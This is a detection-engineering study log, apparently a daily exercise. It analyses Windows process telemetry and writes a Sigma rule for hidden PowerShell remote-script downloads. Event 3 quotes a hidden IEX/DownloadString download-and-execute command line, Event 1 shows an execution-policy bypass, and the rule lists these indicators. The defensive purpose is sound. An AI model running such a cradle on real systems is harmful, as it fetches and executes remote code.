# Day 03 — PowerShell Download Detection

## Objective

Analyze Windows process-creation telemetry and create a Sigma rule to detect suspicious PowerShell behavior involving hidden execution and downloading a remote PowerShell script.

---

## Event Analysis

### Event 1 — Suspicious

**User:** `john`
**Parent:** `explorer.exe`
**Image:** `powershell.exe`
**CommandLine:**

```text
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\john\Downloads\update.ps1
```

The use of `-ExecutionPolicy Bypass` together with execution of a `.ps1` file from the user's Downloads directory is suspicious.

**Assessment:** Suspicious and requires investigation.

---

### Event 2 — Likely Benign

**User:** `SYSTEM`
**Parent:** `services.exe`
**Image:** `powershell.exe`
**CommandLine:**

```text
powershell.exe -NoProfile -Command Get-Service
```

PowerShell is being executed by a system service and is running `Get-Service`, which can be legitimate administrative or system activity.

**Assessment:** Likely benign.

---

### Event 3 — Highly Suspicious

**User:** `john`
**Parent:** `invoice.exe` from a temporary directory
**Image:** `powershell.exe`

```text
powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')
```

Multiple suspicious indicators are present:

* PowerShell execution
* Hidden window
* `IEX`
* `DownloadString`
* Remote `.ps1` download
* Suspicious parent executable
* Parent executable located in a temporary directory

**Assessment:** Highly suspicious.

---

### Event 4 — Likely Benign

**User:** `john`
**Parent:** `explorer.exe`
**Image:** `notepad.exe`

```text
notepad.exe C:\Users\john\Documents\notes.txt
```

This is consistent with normal user activity opening a text file.

**Assessment:** Likely benign.

---

### Event 5 — Likely Benign / Requires Context

**User:** `john`
**Parent:** `explorer.exe`
**Image:** `powershell.exe`

```text
powershell.exe Get-Process
```

PowerShell is being used to retrieve process information. This can be legitimate administrative activity.

**Assessment:** Likely benign, but additional context would be required for a final determination.

---

# Detection Logic

```text
IF Image is powershell.exe
AND CommandLine contains hidden PowerShell execution
AND CommandLine contains DownloadString
THEN generate a detection
```

This is more precise than detecting every PowerShell process.

---

# Sigma Rule

```yaml
title: Suspicious PowerShell Remote Script Download
id: 00000000-0000-0000-0000-000000000004
status: experimental
description: Detects PowerShell using a hidden window and DownloadString to retrieve remote content.
author: Amey Patil
date: 2026-08-11

logsource:
    product: windows
    category: process_creation

detection:
    selection_image:
        Image|endswith: '\powershell.exe'

    selection_command:
        CommandLine|contains:
            - 'DownloadString'
            - 'IEX'
            - '-WindowStyle Hidden'

    condition: selection_image and selection_command

falsepositives:
    - Legitimate administrative activity
    - Authorized automation scripts
    - Security testing

level: high

tags:
    - attack.execution
    - attack.t1059.001
    - attack.command-and-control
```

## Rule Explanation

```text
selection_image
        ↓
PowerShell process

selection_command
        ↓
Suspicious PowerShell behavior

condition
        ↓
PowerShell AND suspicious command-line indicators

        ↓

Detection
```

The important improvement from the original attempt is that the rule checks for **specific suspicious behavior**, rather than treating PowerShell itself as malicious.

---

# False-Positive Analysis

PowerShell is widely used by administrators and automation systems.

Therefore:

```text
powershell.exe ≠ malicious
```

and:

```text
DownloadString ≠ automatically malicious
```

Additional context such as the parent process, user, destination, downloaded content and surrounding events can increase confidence.

---

# Day 03 Lessons Learned

### 1. `Image|endswith`

```yaml
Image|endswith: '\powershell.exe'
```

is useful because Windows telemetry commonly records the full executable path.

### 2. Command-line context matters

Instead of:

```text
PowerShell → Alert
```

we look for:

```text
PowerShell
+
Hidden execution
+
Remote download
```

### 3. Parent process provides context

This is more suspicious:

```text
invoice.exe
      ↓
powershell.exe
```

than:

```text
explorer.exe
      ↓
powershell.exe
```

### 4. Detection is not a verdict

A detection identifies activity that deserves investigation. It does not automatically prove that the activity is malicious.

### 5. Avoid overly broad conditions

A rule such as:

```text
powershell.exe = alert
```

would generate significant noise.

---

# MITRE ATT&CK Mapping

Primary:

```text
T1059.001 — PowerShell
```

The remote download behavior can also be associated with:

```text
T1105 — Ingress Tool Transfer
```

`T1027.010` should **not** be added just because PowerShell is present; command obfuscation needs to actually be present in the detected behavior.

---

# Day 03 Result

**Detection created:** Suspicious PowerShell Remote Script Download

**Skills practiced:**

* Windows process telemetry
* PowerShell analysis
* Command-line analysis
* Parent/child process analysis
* Sigma field selection
* `contains`
* `endswith`
* False-positive analysis
* MITRE ATT&CK mapping

**GitHub commit:**

```text
feat(day03): add suspicious PowerShell download detection
```

**Day 03 complete.**
